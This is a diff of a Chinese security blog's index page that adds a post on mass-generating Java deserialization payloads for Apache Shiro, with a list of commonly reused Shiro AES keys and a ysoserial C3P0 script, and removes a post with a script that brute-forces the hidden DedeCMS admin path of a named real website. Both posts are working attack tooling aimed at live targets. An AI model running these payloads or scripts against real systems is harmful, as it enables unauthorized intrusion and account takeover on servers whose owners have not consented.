@@ -63,6 +63,67 @@
 
   
     
+    <h3 class="article-title"><a href="/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/"><span>Generate all unserialize payload via serialVersionUID</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-01T15:12:02.000Z">
+          2019-04-01
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近遇到了个shiro老版本的反序列漏洞, 但是只能在用URLDNS的时候能成功, 除了CommonsCollections在shiro上是不行的, 使用其他gadget的时候也失败了, 怀疑有SUID的原因。<br>java在打反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常。<br>在目标出现异常时, 如果会输出异常信息并且爆出SUID的情况下解决起来比较容易。<br>但是在通常场景下, 目标服务器都不会输出异常信息,<br>SUID不同原因基本都是因为jar包版本不同所造成(在未显示定义serialVersionUID的情况下, 会通过computeDefaultSUID来计算得出SUID, 不同版本jar包可能存在不同的方法导致算出的SUID不同),<br>在不会输出异常信息的场景下, 由于不知道目标服务器jar包的SUID, 所以只有使用所有可能的SUID来生成反序列payload一个一个的进行尝试,<br>所以这里通过获取所有jar包版本并且调用这些版本的jar包来生成反序列payload。</p>
+<h2 id="Shiro-AES-key"><a href="#Shiro-AES-key" class="headerlink" title="Shiro AES key"></a>Shiro AES key</h2><p>Shiro的反序列payload在经过base64解码, aes解密后才会进行反序列。<br>老版本shiro因为硬编码了默认AES的秘钥导致了问题, 但是很多时候遇到的并不都是默认的秘钥。不过很多代码都是抄抄改改, 所以从github上爬下来了一些用得比较多的的秘钥。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;    :   190</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;    :   157</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;    :   135</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;    :   114</span><br><span class="line">wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;    :   35</span><br><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;    :   27</span><br><span class="line">fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;    :   9</span><br><span class="line">1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;    :   9</span><br><span class="line">ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;    :   8</span><br><span class="line">L7RioUULEFhRyxM7a2R&#x2F;Yg&#x3D;&#x3D;    :   5</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;    :   5</span><br><span class="line">r0e3c16IdVkouZgk1TKVMg&#x3D;&#x3D;    :   4</span><br><span class="line">ZWvohmPdUsAWT3&#x3D;KpPqda       :   4</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;    :   4</span><br><span class="line">bWluZS1hc3NldC1rZXk6QQ&#x3D;&#x3D;    :   3</span><br><span class="line">a2VlcE9uR29pbmdBbmRGaQ&#x3D;&#x3D;    :   3</span><br><span class="line">WcfHGU25gNnTxTlmJMeSpw&#x3D;&#x3D;    :   3</span><br><span class="line">LEGEND-CAMPUS-CIPHERKEY&#x3D;&#x3D;   :   3</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag &#x3D;&#x3D;   :   3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Generate-payload"><a href="#Generate-payload" class="headerlink" title="Generate payload"></a>Generate payload</h2><p>Ysoserial是一个maven项目, 从github上clone下来后首先编译该项目。<br><code>git clone https://github.com/frohoff/ysoserial</code><br><code>mvn compile</code><br>compile会编译该项目并且下载该项目所需要的jar包, 编译生成的字节码在target目录当中。<br>这里通过修改classpath来实现加载不同版本的jar包,<br>在classpath中, 两个不同版本的jar包, 实际项目中会调用的是先定义的jar包。<br>所以这里在修改classpath时, 将需要修改版本的jar包定义在最前, 覆盖掉ysoserial自带的jar包。<br>写了一个很糙的 勉强能用的小脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"><span class="keyword">from</span> xml.dom.minidom <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">repo_url = <span class="string">&quot;http://uk.maven.org/maven2/com/mchange/c3p0/maven-metadata.xml&quot;</span></span><br><span class="line">mvn_home = <span class="string">&quot;/Users/yulegeyu/.m2/repository&quot;</span></span><br><span class="line">yso_path = <span class="string">&quot;/tmp/ysoserial/target/classes&quot;</span></span><br><span class="line">gadget = <span class="string">&quot;C3P0&quot;</span></span><br><span class="line">command = <span class="string">&quot;http://www.baidu.com | base64&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(repo_url)</span><br><span class="line"></span><br><span class="line">html = res.content</span><br><span class="line">root = parseString(html.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">groupId = root.getElementsByTagName(<span class="string">&quot;groupId&quot;</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line">artifactId = root.getElementsByTagName(<span class="string">&quot;artifactId&quot;</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root.getElementsByTagName(<span class="string">&quot;version&quot;</span>):</span><br><span class="line">    version = i.firstChild.data</span><br><span class="line">    <span class="keyword">if</span> version.find(<span class="string">&#x27;-pre&#x27;</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    jar_path = mvn_home + <span class="string">&#x27;/&#x27;</span> + groupId.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;/&#x27;</span> + artifactId + <span class="string">&#x27;/&#x27;</span> + version + <span class="string">&#x27;/&#x27;</span> + artifactId + <span class="string">&#x27;-&#x27;</span> + version + <span class="string">&#x27;.jar&#x27;</span></span><br><span class="line">    cmd = <span class="string">&quot;mvn dependency:get -DremoteRepositories=http://repo1.maven.org/maven2/ -DgroupId=%s -DartifactId=%s -Dversion=%s&quot;</span> \</span><br><span class="line">          % (groupId, artifactId, version)</span><br><span class="line">    child = Popen(cmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class="line">    child.wait()</span><br><span class="line"></span><br><span class="line">    cmd2 = <span class="string">&quot;java -cp &#123;0&#125;:&#123;2&#125;:&#123;1&#125;/net/iharder/base64/2.3.9/base64-2.3.9.jar:&#123;1&#125;/commons-io/commons-io/2.6/commons-io-2.6.jar:&#123;1&#125;/org/reflections/reflections/0.9.9/reflections-0.9.9.jar:&#123;1&#125;/com/google/guava/guava/15.0/guava-15.0.jar:&#123;1&#125;/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.1.1/shrinkwrap-resolver-api-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.1.1/shrinkwrap-resolver-spi-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.1.1/shrinkwrap-resolver-api-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.1.1/shrinkwrap-resolver-spi-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.1.1/shrinkwrap-resolver-api-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-api/1.2.1/shrinkwrap-api-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.1.1/shrinkwrap-resolver-impl-maven-2.1.1.jar:&#123;1&#125;/org/eclipse/aether/aether-api/0.9.0.M2/aether-api-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-impl/0.9.0.M2/aether-impl-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-spi/0.9.0.M2/aether-spi-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-util/0.9.0.M2/aether-util-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-connector-wagon/0.9.0.M2/aether-connector-wagon-0.9.0.M2.jar:&#123;1&#125;/org/apache/maven/maven-aether-provider/3.1.1/maven-aether-provider-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model/3.1.1/maven-model-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model-builder/3.1.1/maven-model-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar:&#123;1&#125;/org/apache/maven/maven-repository-metadata/3.1.1/maven-repository-metadata-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings/3.1.1/maven-settings-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings-builder/3.1.1/maven-settings-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-interpolation/1.19/plexus-interpolation-1.19.jar:&#123;1&#125;/org/codehaus/plexus/plexus-utils/3.0.15/plexus-utils-3.0.15.jar:&#123;1&#125;/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar:&#123;1&#125;/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.1.1/shrinkwrap-resolver-impl-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.1/shrinkwrap-impl-base-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.1/shrinkwrap-spi-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.1.1/shrinkwrap-resolver-spi-maven-archive-2.1.1.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.plexus/0.0.0.M5/org.eclipse.sisu.plexus-0.0.0.M5.jar:&#123;1&#125;/org/sonatype/sisu/sisu-guice/3.1.0/sisu-guice-3.1.0-no_aop.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.inject/0.0.0.M5/org.eclipse.sisu.inject-0.0.0.M5.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar:&#123;1&#125;/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:&#123;1&#125;/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:&#123;1&#125;/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar:&#123;1&#125;/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar:&#123;1&#125;/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar:&#123;1&#125;/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar:&#123;1&#125;/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar:&#123;1&#125;/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar:&#123;1&#125;/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar:&#123;1&#125;/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar:&#123;1&#125;/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:&#123;1&#125;/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar:&#123;1&#125;/commons-beanutils/commons-beanutils/1.9.2/commons-beanutils-1.9.2.jar:&#123;1&#125;/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar:&#123;1&#125;/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:&#123;1&#125;/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:&#123;1&#125;/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar:&#123;1&#125;/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar:&#123;1&#125;/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar:&#123;1&#125;/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar:&#123;1&#125;/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar:&#123;1&#125;/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar:&#123;1&#125;/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar:&#123;1&#125;/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar:&#123;1&#125;/antlr/antlr/2.7.7/antlr-2.7.7.jar:&#123;1&#125;/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar:&#123;1&#125;/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar:&#123;1&#125;/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:&#123;1&#125;/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar:&#123;1&#125;/commons-lang/commons-lang/2.5/commons-lang-2.5.jar:&#123;1&#125;/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar:&#123;1&#125;/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar:&#123;1&#125;/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar:&#123;1&#125;/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-lang/1.4.0/shiro-lang-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-cache/1.4.0/shiro-cache-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-hash/1.4.0/shiro-crypto-hash-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-core/1.4.0/shiro-crypto-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-cipher/1.4.0/shiro-crypto-cipher-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-core/1.4.0/shiro-config-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-ogdl/1.4.0/shiro-config-ogdl-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-event/1.4.0/shiro-event-1.4.0.jar:~/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar:&#123;1&#125;/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar:&#123;1&#125;/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar:&#123;1&#125;/commons-digester/commons-digester/1.8/commons-digester-1.8.jar:&#123;1&#125;/xalan/xalan/2.7.2/xalan-2.7.2.jar:&#123;1&#125;/xalan/serializer/2.7.2/serializer-2.7.2.jar:&#123;1&#125;/rome/rome/1.0/rome-1.0.jar:&#123;1&#125;/jdom/jdom/1.0/jdom-1.0.jar:&#123;1&#125;/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar:&#123;1&#125;/rhino/js/1.7R2/js-1.7R2.jar:&#123;1&#125;/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar:&#123;1&#125;/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar:&#123;1&#125;/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar:&#123;1&#125;/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar:&#123;1&#125;/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar:&#123;1&#125;/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar:&#123;1&#125;/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar:&#123;1&#125;/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar:&#123;1&#125;/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar:&#123;1&#125;/javax/inject/javax.inject/1/javax.inject-1.jar:&#123;1&#125;/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar:&#123;1&#125;/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar:&#123;1&#125;/org/clojure/clojure/1.8.0/clojure-1.8.0.jar:&#123;1&#125;/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar:&#123;1&#125;/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar:&#123;1&#125;/org/w3c/css/sac/1.3/sac-1.3.jar:&#123;1&#125;/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar:&#123;1&#125;/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar:&#123;1&#125;/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar:&#123;1&#125;/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar&quot;</span> \</span><br><span class="line">           <span class="string">&quot; ysoserial.GeneratePayload &#123;3&#125; &#123;4&#125;&quot;</span>.<span class="built_in">format</span>(yso_path, mvn_home, jar_path, gadget, command)</span><br><span class="line">    print(version)</span><br><span class="line">    os.system(cmd2)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ge_1.jpg" alt="-w1351"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2019/03/09/Modify-Ysoseriali-jar-serialVersionUID/"><span>Modify ysoserial jar serialVersionUID</span></a></h3>
     
   
@@ -994,73 +1055,6 @@
 
 
 
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/09/20/dedecms-guess-admin-username-trick/"><span>Dedecms 猜后台管理员账号的一个小技巧</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/09/20/dedecms-guess-admin-username-trick/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-09-20T12:58:29.000Z">
-          2018-09-20
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>巅峰极客里遇到的一个案例(yx-tv.com)。</p>
-<p>案例为,windows下的dedecms 好像是2017版本, 开启了会员中心,修改了后台的路径,<br>然后用之前windows下dedecms找后台路径的方法, 发现tags.php被删除了,<br>但是plus/rss.php文件存在, 然后用这方法就成功的找到了后台。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">payloads &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_-&#39;</span><br><span class="line"></span><br><span class="line">menu &#x3D; &#39;&#39;</span><br><span class="line">for k in range(10):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        data &#x3D; &quot;dopost&#x3D;save&amp;_FILES[b4dboy][tmp_name]&#x3D;..&#x2F;%s%s&lt;&#x2F;images&#x2F;admin_top_logo.gif&amp;_FILES[b4dboy][name]&#x3D;0&amp;_FILES[b4dboy][size]&#x3D;0&amp;_FILES[b4dboy][type]&#x3D;image&#x2F;gif&quot;% (menu, payload)</span><br><span class="line">        res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;www.yx-tv.com&#x2F;plus&#x2F;rss.php&quot;, data&#x3D;data, headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;)</span><br><span class="line">        if res.content.decode(&quot;utf-8&quot;).find(&quot;Error&quot;) &gt; -1:</span><br><span class="line">            menu +&#x3D; payload</span><br><span class="line">            break</span><br><span class="line">        if payload &#x3D;&#x3D; &#39;-&#39;:</span><br><span class="line">            print(menu)</span><br><span class="line">            sys.exit()</span><br><span class="line">print(menu)</span><br></pre></td></tr></table></figure>
-
-<p>然后猜了下后台的管理员账户, 没猜到, admin直接提示账户不存在。<br>然后再利用之前的重置管理员密码的漏洞。<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1959">https://xz.aliyun.com/t/1959</a><br>成功重置了管理员的密码, 但是修改cookie登录后, 发现显示的管理员账号是admin, 但是之前在登录后台的时候试了下admin, 是直接提示的账户不存在。<br>(好像是显示的是uname, 但是最终登录是看的userid)</p>
-<p>后面发现在dede/login.php中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $cuserLogin-&gt;checkUser($userid,$pwd);</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  检验用户是否正确</span><br><span class="line"> *</span><br><span class="line"> * @access    public</span><br><span class="line"> * @param     string    $username  用户名</span><br><span class="line"> * @param     string    $userpwd  密码</span><br><span class="line"> * @return    string</span><br><span class="line"> *&#x2F;</span><br><span class="line">function checkUser($username, $userpwd)</span><br><span class="line">&#123;</span><br><span class="line">    global $dsql;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;只允许用户名和密码用0-9,a-z,A-Z,&#39;@&#39;,&#39;_&#39;,&#39;.&#39;,&#39;-&#39;这些字符</span><br><span class="line">    $this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br><span class="line">    $this-&gt;userPwd &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $userpwd);</span><br><span class="line">    $pwd &#x3D; substr(md5($this-&gt;userPwd), 5, 20);</span><br><span class="line">    $dsql-&gt;SetQuery(&quot;SELECT admin.*,atype.purviews FROM &#96;#@__admin&#96; admin LEFT JOIN &#96;#@__admintype&#96; atype ON atype.rank&#x3D;admin.usertype WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;&#39; LIMIT 0,1&quot;);</span><br><span class="line">    $dsql-&gt;Execute();</span><br><span class="line">    $row &#x3D; $dsql-&gt;GetObject();</span><br><span class="line">    if(!isset($row-&gt;pwd))</span><br><span class="line">    &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else if($pwd!&#x3D;$row-&gt;pwd)</span><br><span class="line">    &#123;</span><br><span class="line">        return -2;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $loginip &#x3D; GetIP();</span><br><span class="line">        $this-&gt;userID &#x3D; $row-&gt;id;</span><br><span class="line">        $this-&gt;userType &#x3D; $row-&gt;usertype;</span><br><span class="line">        $this-&gt;userChannel &#x3D; $row-&gt;typeid;</span><br><span class="line">        $this-&gt;userName &#x3D; $row-&gt;uname;</span><br><span class="line">        $this-&gt;userPurview &#x3D; $row-&gt;purviews;</span><br><span class="line">        $inquery &#x3D; &quot;UPDATE &#96;#@__admin&#96; SET loginip&#x3D;&#39;$loginip&#39;,logintime&#x3D;&#39;&quot;.time().&quot;&#39; WHERE id&#x3D;&#39;&quot;.$row-&gt;id.&quot;&#39;&quot;;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($inquery);</span><br><span class="line">        $sql &#x3D; &quot;UPDATE #@__member SET logintime&#x3D;&quot;.time().&quot;, loginip&#x3D;&#39;$loginip&#39; WHERE mid&#x3D;&quot;.$row-&gt;id;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($sql);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先通过用户输入的用户名查询出密码, 如果有记录的话, 就比对密码。<br>但是在这里 根据用户名查询密码的时候</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;</span><br></pre></td></tr></table></figure>
-<p>竟然是用的like。</p>
